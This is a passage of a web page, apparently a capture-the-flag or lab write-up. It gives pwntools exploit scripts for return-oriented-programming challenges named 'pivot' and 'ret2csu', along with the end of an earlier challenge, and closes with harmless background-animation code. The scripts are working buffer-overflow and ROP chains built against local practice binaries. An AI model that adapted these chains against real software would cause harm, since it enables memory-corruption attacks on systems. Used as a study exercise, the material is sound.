+<span class="line"><span style="color:#24292E">payload </span><span style="color:#D73A49">=</span><span style="color:#D73A49"> b</span><span style="color:#032F62">'A'</span><span style="color:#D73A49"> *</span><span style="color:#005CC5"> 32</span><span style="color:#D73A49"> +</span><span style="color:#D73A49"> b</span><span style="color:#032F62">'B'</span><span style="color:#D73A49"> *</span><span style="color:#005CC5"> 8</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#D73A49">for</span><span style="color:#24292E"> i </span><span style="color:#D73A49">in</span><span style="color:#005CC5"> range</span><span style="color:#24292E">(</span><span style="color:#005CC5">0</span><span style="color:#24292E">, </span><span style="color:#005CC5">8</span><span style="color:#24292E">):</span></span>
+<span class="line"><span style="color:#24292E">   payload </span><span style="color:#D73A49">+=</span><span style="color:#24292E"> pop_rdi</span></span>
+<span class="line"><span style="color:#24292E">   payload </span><span style="color:#D73A49">+=</span><span style="color:#24292E"> p64(reserved_addr_bss </span><span style="color:#D73A49">+</span><span style="color:#24292E"> i)  </span><span style="color:#6A737D"># shoved bss into rdi</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#D73A49">   if</span><span style="color:#24292E"> i </span><span style="color:#D73A49">==</span><span style="color:#005CC5"> 0</span><span style="color:#24292E">:</span></span>
+<span class="line"><span style="color:#24292E">      prev_al </span><span style="color:#D73A49">=</span><span style="color:#24292E"> initial_rax  </span><span style="color:#6A737D"># first al is a section of rax, which is initially 0xb</span></span>
+<span class="line"><span style="color:#D73A49">   else</span><span style="color:#24292E">:</span></span>
+<span class="line"><span style="color:#24292E">      prev_al </span><span style="color:#D73A49">=</span><span style="color:#24292E"> flag_file[i</span><span style="color:#D73A49">-</span><span style="color:#005CC5">1</span><span style="color:#24292E">]</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#24292E">   target_addr </span><span style="color:#D73A49">=</span><span style="color:#24292E"> char_addrs[i]</span></span>
+<span class="line"><span style="color:#24292E">   rcx_val </span><span style="color:#D73A49">=</span><span style="color:#24292E"> target_addr </span><span style="color:#D73A49">-</span><span style="color:#24292E"> prev_al </span><span style="color:#D73A49">-</span><span style="color:#D73A49"> 0x</span><span style="color:#005CC5">3ef2</span><span style="color:#6A737D">  # compensate for the instruction "add rcx, 0x3ef2"</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#24292E">   payload </span><span style="color:#D73A49">+=</span><span style="color:#24292E"> bextr_gadget</span></span>
+<span class="line"><span style="color:#24292E">   payload </span><span style="color:#D73A49">+=</span><span style="color:#24292E"> p64(</span><span style="color:#D73A49">0x</span><span style="color:#005CC5">4000</span><span style="color:#24292E">)  </span><span style="color:#6A737D"># rdx -> rdx = bitmask for bextr (start bit=0, length=64)</span></span>
+<span class="line"><span style="color:#24292E">   payload </span><span style="color:#D73A49">+=</span><span style="color:#24292E"> p64(rcx_val)  </span><span style="color:#6A737D"># rcx -> adjusted target addr offset</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#24292E">   payload </span><span style="color:#D73A49">+=</span><span style="color:#24292E"> xlatb_ret  </span><span style="color:#6A737D"># al = rbx[al] (the byte we want to write) is now in al</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#24292E">   payload </span><span style="color:#D73A49">+=</span><span style="color:#24292E"> stos  </span><span style="color:#6A737D"># store al into memory at address in rdi which we shoved in earlier</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#24292E">payload </span><span style="color:#D73A49">+=</span><span style="color:#24292E"> pop_rdi</span></span>
+<span class="line"><span style="color:#24292E">payload </span><span style="color:#D73A49">+=</span><span style="color:#24292E"> p64(reserved_addr_bss)</span></span>
+<span class="line"><span style="color:#24292E">payload </span><span style="color:#D73A49">+=</span><span style="color:#24292E"> print_file_call</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#24292E">io.recvuntil(</span><span style="color:#D73A49">b</span><span style="color:#032F62">'> '</span><span style="color:#24292E">)</span></span>
+<span class="line"><span style="color:#24292E">io.sendline(payload)</span></span>
+<span class="line"><span style="color:#24292E">io.interactive()</span></span></code></pre>
+<h2 id="chall-7-pivot">Chall 7: pivot</h2>
+<pre class="astro-code github-light" style="background-color:#fff;color:#24292e; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="py"><code><span class="line"><span style="color:#D73A49">from</span><span style="color:#24292E"> pwn </span><span style="color:#D73A49">import</span><span style="color:#D73A49"> *</span></span>
+<span class="line"><span style="color:#D73A49">import</span><span style="color:#24292E"> time</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#24292E">elf </span><span style="color:#D73A49">=</span><span style="color:#24292E"> ELF(</span><span style="color:#032F62">'./pivot'</span><span style="color:#24292E">)</span></span>
+<span class="line"><span style="color:#24292E">libc </span><span style="color:#D73A49">=</span><span style="color:#24292E"> ELF(</span><span style="color:#032F62">'libpivot.so'</span><span style="color:#24292E">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#24292E">io </span><span style="color:#D73A49">=</span><span style="color:#24292E"> process(elf.path)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#24292E">data </span><span style="color:#D73A49">=</span><span style="color:#24292E"> io.recv()</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#D73A49">for</span><span style="color:#24292E"> line </span><span style="color:#D73A49">in</span><span style="color:#24292E"> data.split(</span><span style="color:#D73A49">b</span><span style="color:#032F62">'</span><span style="color:#005CC5">\n</span><span style="color:#032F62">'</span><span style="color:#24292E">):</span></span>
+<span class="line"><span style="color:#D73A49">    if</span><span style="color:#D73A49"> b</span><span style="color:#032F62">'0x'</span><span style="color:#D73A49"> in</span><span style="color:#24292E"> line:</span></span>
+<span class="line"><span style="color:#24292E">        pivot_int </span><span style="color:#D73A49">=</span><span style="color:#005CC5"> int</span><span style="color:#24292E">(line.strip().split(</span><span style="color:#D73A49">b</span><span style="color:#032F62">'0x'</span><span style="color:#24292E">)[</span><span style="color:#005CC5">1</span><span style="color:#24292E">], </span><span style="color:#005CC5">16</span><span style="color:#24292E">)</span></span>
+<span class="line"><span style="color:#D73A49">        break</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#24292E">offset </span><span style="color:#D73A49">=</span><span style="color:#24292E"> libc.symbols[</span><span style="color:#032F62">'ret2win'</span><span style="color:#24292E">] </span><span style="color:#D73A49">-</span><span style="color:#24292E"> libc.symbols[</span><span style="color:#032F62">'foothold_function'</span><span style="color:#24292E">]</span></span>
+<span class="line"><span style="color:#005CC5">print</span><span style="color:#24292E">(</span><span style="color:#D73A49">f</span><span style="color:#032F62">"offset: </span><span style="color:#005CC5">{hex</span><span style="color:#24292E">(offset)</span><span style="color:#005CC5">}</span><span style="color:#032F62">"</span><span style="color:#24292E">)</span></span>
+<span class="line"></span>
+<span class="line"></span>
+<span class="line"><span style="color:#24292E">foothold </span><span style="color:#D73A49">=</span><span style="color:#24292E"> p64(</span><span style="color:#D73A49">0x</span><span style="color:#005CC5">0000000000400720</span><span style="color:#24292E">)</span></span>
+<span class="line"><span style="color:#24292E">foothold_got_addr </span><span style="color:#D73A49">=</span><span style="color:#24292E"> elf.got[</span><span style="color:#032F62">'foothold_function'</span><span style="color:#24292E">]</span></span>
+<span class="line"><span style="color:#24292E">foothold_got </span><span style="color:#D73A49">=</span><span style="color:#24292E"> p64(foothold_got_addr)</span></span>
+<span class="line"><span style="color:#24292E">pop_rax_ret </span><span style="color:#D73A49">=</span><span style="color:#24292E"> p64(</span><span style="color:#D73A49">0x</span><span style="color:#005CC5">00000000004009bb</span><span style="color:#24292E">)</span></span>
+<span class="line"><span style="color:#24292E">mov_rax_qword_ptr </span><span style="color:#D73A49">=</span><span style="color:#24292E"> p64(</span><span style="color:#D73A49">0x</span><span style="color:#005CC5">00000000004009c0</span><span style="color:#24292E">)</span></span>
+<span class="line"><span style="color:#24292E">pop_rbp </span><span style="color:#D73A49">=</span><span style="color:#24292E"> p64(</span><span style="color:#D73A49">0x</span><span style="color:#005CC5">00000000004007c8</span><span style="color:#24292E">)</span></span>
+<span class="line"><span style="color:#24292E">add_rax_rbp </span><span style="color:#D73A49">=</span><span style="color:#24292E"> p64(</span><span style="color:#D73A49">0x</span><span style="color:#005CC5">00000000004009c4</span><span style="color:#24292E">)</span></span>
+<span class="line"><span style="color:#24292E">call_rax </span><span style="color:#D73A49">=</span><span style="color:#24292E"> p64(</span><span style="color:#D73A49">0x</span><span style="color:#005CC5">00000000004006b0</span><span style="color:#24292E">)</span></span>
+<span class="line"><span style="color:#24292E">xchg_rsp_rax_ret </span><span style="color:#D73A49">=</span><span style="color:#24292E"> p64(</span><span style="color:#D73A49">0x</span><span style="color:#005CC5">00000000004009bd</span><span style="color:#24292E">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#24292E">rop_chain </span><span style="color:#D73A49">=</span><span style="color:#D73A49"> b</span><span style="color:#032F62">''</span></span>
+<span class="line"><span style="color:#24292E">rop_chain </span><span style="color:#D73A49">+=</span><span style="color:#24292E"> foothold</span></span>
+<span class="line"><span style="color:#24292E">rop_chain </span><span style="color:#D73A49">+=</span><span style="color:#24292E"> pop_rax_ret</span></span>
+<span class="line"><span style="color:#24292E">rop_chain </span><span style="color:#D73A49">+=</span><span style="color:#24292E"> foothold_got</span></span>
+<span class="line"><span style="color:#24292E">rop_chain </span><span style="color:#D73A49">+=</span><span style="color:#24292E"> mov_rax_qword_ptr</span></span>
+<span class="line"><span style="color:#24292E">rop_chain </span><span style="color:#D73A49">+=</span><span style="color:#24292E"> pop_rbp</span></span>
+<span class="line"><span style="color:#24292E">rop_chain </span><span style="color:#D73A49">+=</span><span style="color:#24292E"> p64(offset)</span></span>
+<span class="line"><span style="color:#24292E">rop_chain </span><span style="color:#D73A49">+=</span><span style="color:#24292E"> add_rax_rbp</span></span>
+<span class="line"><span style="color:#24292E">rop_chain </span><span style="color:#D73A49">+=</span><span style="color:#24292E"> call_rax</span></span>
+<span class="line"></span>
+<span class="line"></span>
+<span class="line"><span style="color:#24292E">pivot_payload </span><span style="color:#D73A49">=</span><span style="color:#D73A49"> b</span><span style="color:#032F62">'A'</span><span style="color:#D73A49"> *</span><span style="color:#005CC5"> 32</span><span style="color:#D73A49"> +</span><span style="color:#D73A49"> b</span><span style="color:#032F62">'B'</span><span style="color:#D73A49"> *</span><span style="color:#005CC5"> 8</span></span>
+<span class="line"><span style="color:#24292E">pivot_payload </span><span style="color:#D73A49">+=</span><span style="color:#24292E"> pop_rax_ret</span></span>
+<span class="line"><span style="color:#24292E">pivot_payload </span><span style="color:#D73A49">+=</span><span style="color:#24292E"> p64(pivot_int)</span></span>
+<span class="line"><span style="color:#24292E">pivot_payload </span><span style="color:#D73A49">+=</span><span style="color:#24292E"> xchg_rsp_rax_ret</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#24292E">io.sendline(rop_chain)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#24292E">io.recvuntil(</span><span style="color:#D73A49">b</span><span style="color:#032F62">'> '</span><span style="color:#24292E">)</span></span>
+<span class="line"><span style="color:#24292E">io.sendline(pivot_payload)</span></span>
+<span class="line"><span style="color:#24292E">io.interactive()</span></span></code></pre>
+<h2 id="chall-8-ret2csu">Chall 8: ret2csu</h2>
+<pre class="astro-code github-light" style="background-color:#fff;color:#24292e; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="py"><code><span class="line"><span style="color:#D73A49">from</span><span style="color:#24292E"> pwn </span><span style="color:#D73A49">import</span><span style="color:#D73A49"> *</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#24292E">io </span><span style="color:#D73A49">=</span><span style="color:#24292E"> process(</span><span style="color:#032F62">'./ret2csu'</span><span style="color:#24292E">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#24292E">csu_pop  </span><span style="color:#D73A49">=</span><span style="color:#24292E"> p64(</span><span style="color:#D73A49">0x</span><span style="color:#005CC5">40069a</span><span style="color:#24292E">)</span></span>
+<span class="line"><span style="color:#24292E">csu_mov  </span><span style="color:#D73A49">=</span><span style="color:#24292E"> p64(</span><span style="color:#D73A49">0x</span><span style="color:#005CC5">400680</span><span style="color:#24292E">)</span></span>
+<span class="line"><span style="color:#24292E">pop_rdi  </span><span style="color:#D73A49">=</span><span style="color:#24292E"> p64(</span><span style="color:#D73A49">0x</span><span style="color:#005CC5">4006a3</span><span style="color:#24292E">)</span></span>
+<span class="line"><span style="color:#24292E">win_call </span><span style="color:#D73A49">=</span><span style="color:#24292E"> p64(</span><span style="color:#D73A49">0x</span><span style="color:#005CC5">400510</span><span style="color:#24292E">)</span></span>
+<span class="line"><span style="color:#24292E">ret      </span><span style="color:#D73A49">=</span><span style="color:#24292E"> p64(</span><span style="color:#D73A49">0x</span><span style="color:#005CC5">4004e6</span><span style="color:#24292E">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#24292E">arg1, arg2, arg3 </span><span style="color:#D73A49">=</span><span style="color:#24292E"> p64(</span><span style="color:#D73A49">0x</span><span style="color:#005CC5">deadbeefdeadbeef</span><span style="color:#24292E">), p64(</span><span style="color:#D73A49">0x</span><span style="color:#005CC5">cafebabecafebabe</span><span style="color:#24292E">), p64(</span><span style="color:#D73A49">0x</span><span style="color:#005CC5">d00df00dd00df00d</span><span style="color:#24292E">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#24292E">payload </span><span style="color:#D73A49">=</span><span style="color:#D73A49"> b</span><span style="color:#032F62">'A'</span><span style="color:#D73A49"> *</span><span style="color:#005CC5"> 32</span><span style="color:#D73A49"> +</span><span style="color:#D73A49"> b</span><span style="color:#032F62">'B'</span><span style="color:#D73A49"> *</span><span style="color:#005CC5"> 8</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#24292E">payload </span><span style="color:#D73A49">+=</span><span style="color:#24292E"> csu_pop</span></span>
+<span class="line"><span style="color:#24292E">payload </span><span style="color:#D73A49">+=</span><span style="color:#24292E"> p64(</span><span style="color:#005CC5">0</span><span style="color:#24292E">)</span></span>
+<span class="line"><span style="color:#24292E">payload </span><span style="color:#D73A49">+=</span><span style="color:#24292E"> p64(</span><span style="color:#005CC5">1</span><span style="color:#24292E">)</span></span>
+<span class="line"><span style="color:#24292E">payload </span><span style="color:#D73A49">+=</span><span style="color:#24292E"> p64(</span><span style="color:#D73A49">0x</span><span style="color:#005CC5">600df8</span><span style="color:#24292E">)</span></span>
+<span class="line"><span style="color:#24292E">payload </span><span style="color:#D73A49">+=</span><span style="color:#24292E"> p64(</span><span style="color:#005CC5">0</span><span style="color:#24292E">)</span></span>
+<span class="line"><span style="color:#24292E">payload </span><span style="color:#D73A49">+=</span><span style="color:#24292E"> arg2</span></span>
+<span class="line"><span style="color:#24292E">payload </span><span style="color:#D73A49">+=</span><span style="color:#24292E"> arg3</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#24292E">payload </span><span style="color:#D73A49">+=</span><span style="color:#24292E"> csu_mov</span></span>
+<span class="line"><span style="color:#24292E">payload </span><span style="color:#D73A49">+=</span><span style="color:#24292E"> p64(</span><span style="color:#005CC5">0</span><span style="color:#24292E">) </span><span style="color:#D73A49">*</span><span style="color:#005CC5"> 7</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#24292E">payload </span><span style="color:#D73A49">+=</span><span style="color:#24292E"> pop_rdi</span></span>
+<span class="line"><span style="color:#24292E">payload </span><span style="color:#D73A49">+=</span><span style="color:#24292E"> arg1</span></span>
+<span class="line"><span style="color:#24292E">payload </span><span style="color:#D73A49">+=</span><span style="color:#24292E"> win_call</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#005CC5">print</span><span style="color:#24292E">(</span><span style="color:#D73A49">f</span><span style="color:#032F62">"gdb -q -p </span><span style="color:#005CC5">{</span><span style="color:#24292E">io.pid</span><span style="color:#005CC5">}</span><span style="color:#032F62">"</span><span style="color:#24292E">)</span></span>
+<span class="line"><span style="color:#24292E">pause()</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#24292E">io.sendline(payload)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#24292E">io.interactive()</span></span></code></pre>  </div> </section> </article>  </main> <footer class="site-footer"></footer> </div> <script>(function(){const backgroundConfig = {"reach":118,"pointerReach":148,"nodeDensity":0.00014,"maxNodes":220,"velocity":0.3,"nodeOpacity":0.52,"lineOpacity":0.32,"pointerLineOpacity":0.52,"pointerNodeOpacity":0.44};
+
+			(() => {
+				if (window.__signalArrayBackgroundInitialized) return;
+				window.__signalArrayBackgroundInitialized = true;
+
+				const canvas = document.querySelector('.site-background__canvas');
+				if (!(canvas instanceof HTMLCanvasElement)) return;
+
+				const context = canvas.getContext('2d');
+				if (!context) return;
+
+				const mediaQuery = window.matchMedia('(prefers-reduced-motion: reduce)');
+				const pointer = {
+					x: 0,
+					y: 0,
+					targetX: 0,
+					targetY: 0,
+					active: false,
+					strength: 0,
+				};
+
+				let width = 0;
+				let height = 0;
+				let dpr = 1;
+				let nodes = [];
+				let frameId = 0;
+
+				const reach = backgroundConfig.reach;
+				const pointerReach = backgroundConfig.pointerReach;
+				const nodeDensity = backgroundConfig.nodeDensity;
+				const maxNodes = backgroundConfig.maxNodes;
+				const velocity = backgroundConfig.velocity;
+				const nodeOpacity = backgroundConfig.nodeOpacity;
+				const lineOpacity = backgroundConfig.lineOpacity;
+				const pointerLineOpacity = backgroundConfig.pointerLineOpacity;
+				const pointerNodeOpacity = backgroundConfig.pointerNodeOpacity;
+
+				const createNode = () => ({
+					x: Math.random() * width,
+					y: Math.random() * height,
+					vx: (Math.random() - 0.5) * velocity,
+					vy: (Math.random() - 0.5) * velocity,
+					radius: 1 + Math.random() * 0.85,
+				});
+
+				const rebuildNodes = () => {
+					const count = Math.min(maxNodes, Math.max(38, Math.round(width * height * nodeDensity)));
+					nodes = Array.from({ length: count }, () => createNode());
+				};
+
+				const resize = () => {
+					width = Math.max(320, Math.floor(window.innerWidth));
+					height = Math.max(260, Math.floor(window.innerHeight));
+					dpr = Math.min(window.devicePixelRatio || 1, 2);
+					canvas.width = Math.round(width * dpr);
+					canvas.height = Math.round(height * dpr);
+					canvas.style.width = `${width}px`;
+					canvas.style.height = `${height}px`;
+					context.setTransform(dpr, 0, 0, dpr, 0, 0);
+					rebuildNodes();
+				};
+
+				const onPointerMove = (event) => {
+					pointer.targetX = event.clientX;
+					pointer.targetY = event.clientY;
+					if (!pointer.active) {
+						pointer.x = event.clientX;
+						pointer.y = event.clientY;
+					}
+					pointer.active = true;
+				};
+
+				const onPointerLeave = () => {
+					pointer.active = false;
+				};
+
+				const draw = () => {
+					frameId = window.requestAnimationFrame(draw);
+					context.clearRect(0, 0, width, height);
+
+					const easing = mediaQuery.matches ? 1 : 0.24;
+					pointer.x += (pointer.targetX - pointer.x) * easing;
+					pointer.y += (pointer.targetY - pointer.y) * easing;
+					pointer.strength += ((pointer.active ? 1 : 0) - pointer.strength) * 0.14;
+
+					for (let i = 0; i < nodes.length; i += 1) {
+						const node = nodes[i];
+						if (!mediaQuery.matches) {
+							node.x += node.vx;
+							node.y += node.vy;
+
+							if (node.x < -12) node.x = width + 12;
+							if (node.x > width + 12) node.x = -12;
+							if (node.y < -12) node.y = height + 12;
+							if (node.y > height + 12) node.y = -12;
+						}
+
+						context.beginPath();
+						context.fillStyle = `rgba(33, 70, 111, ${nodeOpacity})`;
+						context.arc(node.x, node.y, node.radius, 0, Math.PI * 2);
+						context.fill();
+
+						for (let j = i + 1; j < nodes.length; j += 1) {
+							const neighbor = nodes[j];
+							const dx = neighbor.x - node.x;
+							const dy = neighbor.y - node.y;
+							const distance = Math.hypot(dx, dy);
+							if (distance > reach) continue;
+
+							const lineAlpha = (1 - distance / reach) * lineOpacity;
+							context.beginPath();
+							context.moveTo(node.x, node.y);
+							context.lineTo(neighbor.x, neighbor.y);
+							context.strokeStyle = `rgba(33, 70, 111, ${lineAlpha})`;
+							context.lineWidth = 0.75;
+							context.stroke();
+						}
+
+						if (pointer.strength < 0.02) continue;
+
+						const pointerDx = pointer.x - node.x;
+						const pointerDy = pointer.y - node.y;
+						const pointerDistance = Math.hypot(pointerDx, pointerDy);
+						if (pointerDistance > pointerReach) continue;
+
+						const pointerAlpha =
+							(1 - pointerDistance / pointerReach) * pointerLineOpacity * pointer.strength;
+						context.beginPath();
+						context.moveTo(node.x, node.y);
+						context.lineTo(pointer.x, pointer.y);
+						context.strokeStyle = `rgba(33, 70, 111, ${pointerAlpha})`;
+						context.lineWidth = 0.9;
+						context.stroke();
+
+						context.beginPath();
+						context.fillStyle = `rgba(33, 70, 111, ${pointerNodeOpacity * pointer.strength})`;
+						context.arc(node.x, node.y, node.radius + 0.45, 0, Math.PI * 2);
+						context.fill();
+					}
+				};
+
+				window.addEventListener('resize', resize);
+				window.addEventListener('pointermove', onPointerMove, { passive: true });
+				window.addEventListener('pointerleave', onPointerLeave);
+
+				resize();
+				draw();
+
+				window.addEventListener(
+					'beforeunload',
+					() => {
+						window.cancelAnimationFrame(frameId);
+						window.removeEventListener('resize', resize);
+						window.removeEventListener('pointermove', onPointerMove);
+						window.removeEventListener('pointerleave', onPointerLeave);
+					},
+					{ once: true },
+				);
+			})();
+		})();</script> </body> </html>
